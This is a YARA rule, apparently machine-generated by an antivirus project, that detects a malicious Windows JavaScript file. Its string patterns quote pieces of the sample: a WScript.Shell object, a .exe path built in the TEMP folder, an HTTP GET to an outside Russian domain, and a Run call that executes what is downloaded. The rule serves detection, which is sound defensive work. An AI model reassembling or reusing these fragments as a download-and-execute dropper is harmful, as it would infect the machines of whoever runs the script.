rule sig_20160330_0d17685872b51a6264ac622aa13aa154 {
  meta:
    description = "datamaliciousorder - file 20160330_0d17685872b51a6264ac622aa13aa154.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fc37961293d9865599df7535af416a0a86e29dd328ebcf33ab4d345916cd857d"

  strings:
    $s1  = "var ZT = function ZE() {return WScript[T0](\"WScript\"+\".Shell\");}(), S0 = 11;" fullword ascii
    $s2  = "function I(S1, IW){T = T * 1; return S1 - IW;};" fullword ascii
    $s3  = "function NG() {return ZT[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9O10f7CBiScjX.ex\" + \"e\";};" fullword ascii
    $s4  = "function KK(){return Q1 + \"\";};" fullword ascii
    $s5  = "CA[OU](\"GET\", \"http://jafes.ru/b0ros\", false);" fullword ascii
    $s6  = "if (CA[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "function A() {return ((VZ == true) && (VZ == RU)) ? 1 : T;};" fullword ascii
    $s8  = "function Q(Y){ZT[\"Run\"](Y, T, T);};" fullword ascii
    $s9  = "var N0 = new this[\"Date\"]();" fullword ascii
    $s10 = "}while (P);" fullword ascii
    $s11 = "function US(){return 22;};" fullword ascii
    $s12 = "function TT(){return T0;};" fullword ascii
    $s13 = "function M(N) {var J = (1, 2, 3, 4, 5, N); return J;};" fullword ascii
    $s14 = "return I(Q3, S);" fullword ascii
    $s15 = "var O = false;" fullword ascii
    $s16 = "var RU = false;" fullword ascii
    $s17 = "RU = true; " fullword ascii
    $s18 = "var VZ = false;" fullword ascii
    $s19 = "VZ = true; " fullword ascii
    $s20 = "} catch(C){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}